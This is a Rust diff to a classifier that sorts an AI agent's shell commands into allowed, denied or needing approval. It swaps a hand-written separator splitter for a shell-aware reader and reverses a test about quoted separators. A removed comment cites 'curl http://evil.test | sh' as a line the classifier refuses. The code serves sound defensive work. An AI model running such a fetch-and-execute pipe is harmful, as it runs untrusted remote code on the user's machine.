@@ -451,6 +451,7 @@ pub fn classify(
             .unwrap_or(""),
         cwd,
         policy,
+        shell_for(tool_name),
     )
 }
 
@@ -458,6 +459,7 @@ fn classify_shell_command(
     command: &str,
     cwd: Option<&Path>,
     policy: &crate::github::Policy,
+    shell: crate::command_reader::Shell,
 ) -> Classification {
     let normalized = normalize_command(command);
 
@@ -489,12 +491,19 @@ fn classify_shell_command(
     //
     // This sits AFTER the destructive checks on purpose: a hidden command the blocklist already
     // recognizes must keep its stronger `deny`, not be demoted to an approval prompt.
-    let Some(segments) = shell_segments(command) else {
-        return classification(
-            "pending_approval",
-            "unrecognized",
-            "unrecognized shell commands and code execution require approval",
-        );
+    let segments = match crate::command_reader::read(command, shell) {
+        crate::command_reader::Reading::Sequence(segments) => segments,
+        // The reason is carried into the refusal rather than dropped. A run parked by this branch
+        // used to be told only that its command was "unrecognized", which is the sentence that cost
+        // three relaunches on 2026-08-27 — the reader knows WHICH form it could not read, and the
+        // person reading the proposal is the one who has to act on it.
+        crate::command_reader::Reading::Unreadable(reason) => {
+            return classification(
+                "pending_approval",
+                "unrecognized",
+                &format!("this shell line cannot be read as a sequence of commands: {reason}"),
+            );
+        }
     };
     if segments.is_empty() {
         return classification(
@@ -603,99 +612,19 @@ fn classify_segment(segment: &str, cwd: Option<&Path>, policy: &crate::github::P
     Segment::Unrecognized
 }
 
-/// The pieces a shell line runs one after another, or `None` when the line does something that
-/// cannot be read as a sequence of commands at all.
+/// Which shell will run a tool call's command line.
 ///
-/// This replaced "any metacharacter means ask a human". That rule was cheap and it was honest about
-/// what it did not know, but it made the classifier refuse to read the exact commands an agent
-/// writes. The dogfood of 2026-08-08 skipped every item it had, and the three lines it skipped were
-///
-///   cd "C:\...\job-4" && python -m unittest test_greet -v
-///   cd "C:\...\job-3" && python -m unittest test_greet.py -v
-///   find . -iname "greet.py" -o -iname "test_greet.py" | grep -v node_modules
-///
-/// — every piece of which is on the allow list. The `&&` and the `|` were the whole objection.
-///
-/// A separator is not a hole. `A && B`, `A | B` and `A ; B` all run A and then B, and both halves
-/// are commands this file can already read. So it reads them: each piece has to earn `allow` on its
-/// own, and `curl http://evil.test | sh` is refused by the `sh`, which is where the refusal
-/// belonged. That is a stricter reading than the old rule, not a looser one — the old rule never
-/// looked at the second half at all, it just declined to answer.
-///
-/// `None` is for the forms that are not a sequence and cannot be made into one:
-///
-/// - `$(...)` and backticks run a nested command INSIDE an argument, before the outer program
-///   starts, so there is no second piece to hand back. Backtick is PowerShell's escape character
-///   besides.
-/// - a lone `&` backgrounds a command in POSIX shells, so it outlives the decision being made
-///   about it. This also disposes of `&>out.txt`, bash's shorthand for redirecting both streams to
-///   a file, before `redirects_a_file` would have to know about it.
-///
-/// Redirection is deliberately NOT here, though it was: `>` and `<` are judged per piece, in
-/// `redirects_a_file`, because `2>&1` is glued to the separator that follows it and the two can only
-/// be told apart after the cut.
-///
-/// **Quotes are deliberately not honoured.** `git commit -m "a && b"` splits into two pieces and
-/// the second does not earn `allow`, so it still asks — a false alarm, and exactly today's answer.
-/// Honouring quotes means matching a real shell's escaping rules, which differ between PowerShell
-/// and bash; being wrong there means failing to split where the shell DOES, and that is the one
-/// direction this must not be wrong in. Splitting too eagerly only ever adds a piece that has to
-/// earn its own verdict.
-fn shell_segments(command: &str) -> Option<Vec<&str>> {
-    if command.contains("$(") || command.contains('`') {
-        return None;
+/// The reader needs it, and this is where the answer exists: by the time a command reaches
+/// `classify_shell_command` the tool name is gone. Anything that is not the PowerShell tool is
+/// read as POSIX, which is the safe direction — a `Bash` line misread as PowerShell would be split
+/// too eagerly and merely asked about, while the reverse would honour quotes a POSIX shell does
+/// not have.
+fn shell_for(tool_name: &str) -> crate::command_reader::Shell {
+    if tool_name == "PowerShell" {
+        crate::command_reader::Shell::PowerShell
+    } else {
+        crate::command_reader::Shell::Posix
     }
-
-    let bytes = command.as_bytes();
-    let mut segments = Vec::new();
-    let (mut start, mut index) = (0, 0);
-    while index < bytes.len() {
-        // Separators are ASCII, and every cut lands on one or just after one, so the slices below
-        // are always on a character boundary. A UTF-8 continuation byte is >= 0x80 and falls
-        // through to the step at the bottom.
-        let width = match bytes[index] {
-            b'&' => {
-                // The `&` of a `>&` belongs to the redirection, not to this list: `2>&1` joins two
-                // streams and backgrounds nothing. Order is what tells them apart, and it has to be
-                // read here because the alternative — a whole-line scan — is what `redirects_a_file`
-                // exists to avoid. `&>` is the other order and still refuses the line: that one is
-                // bash's shorthand for sending both streams to a FILE.
-                if index > 0 && bytes[index - 1] == b'>' {
-                    index += 1;
-                    continue;
-                }
-                if bytes.get(index + 1) != Some(&b'&') {
-                    return None;
-                }
-                2
-            }
-            b'|' => {
-                if bytes.get(index + 1) == Some(&b'|') {
-                    2
-                } else {
-                    1
-                }
-            }
-            b';' | b'\n' | b'\r' => 1,
-            _ => {
-                index += 1;
-                continue;
-            }
-        };
-        segments.push(&command[start..index]);
-        index += width;
-        start = index;
-    }
-    segments.push(&command[start..]);
-
-    // Empty pieces are punctuation, not commands: a trailing `;` is not a thing to classify.
-    Some(
-        segments
-            .into_iter()
-            .map(str::trim)
-            .filter(|segment| !segment.is_empty())
-            .collect(),
-    )
 }
 
 /// Whether a piece is one of the commands judged by WHERE IT LANDS, and lands inside the workspace.
@@ -2887,17 +2816,34 @@ mod tests {
         }
     }
 
-    /// A documented false alarm, and the direction to be wrong in.
+    /// REVERSED on 2026-08-30, deliberately, and the reading it replaced is kept here so the
+    /// change is legible rather than silent.
     ///
-    /// Honouring quotes means matching a real shell's escaping rules, which differ between
-    /// PowerShell and bash. Being wrong there means failing to split where the shell DOES — the one
-    /// direction this must never be wrong in. Splitting too eagerly only adds a piece that has to
-    /// earn its own verdict, and this test is what that costs.
+    /// This test used to assert the opposite, and its argument was: honouring quotes means matching
+    /// a real shell's escaping rules, those rules differ between PowerShell and bash, and failing
+    /// to split where the shell DOES is the one direction this must never be wrong in. Every clause
+    /// of that is still true. What changed is that the shell is no longer unknown — `classify` is
+    /// handed the tool name and `command_reader` is given a `Shell`, so the POSIX grammar reaches
+    /// only lines a POSIX shell will run.
+    ///
+    /// What the old reading cost is measured rather than supposed: on 2026-08-29 four consecutive
+    /// autonomous runs were stopped, one of them for an alternation inside a `grep` pattern.
     #[test]
-    fn a_separator_inside_quotes_still_costs_an_approval() {
+    fn a_separator_inside_quotes_is_part_of_the_argument() {
         assert_classification(
             classify(
                 "Bash",
+                &json!({"command": "git commit -m \"fixes a && b\""}),
+                Some(Path::new(r"C:\work\repo")),
+            ),
+            "allow",
+            "vcs-local",
+        );
+        // The same line under PowerShell keeps the old answer, and that is what makes the sentence
+        // above — "only lines a POSIX shell will run" — an assertion rather than a claim.
+        assert_classification(
+            classify(
+                "PowerShell",
                 &json!({"command": "git commit -m \"fixes a && b\""}),
                 Some(Path::new(r"C:\work\repo")),
             ),
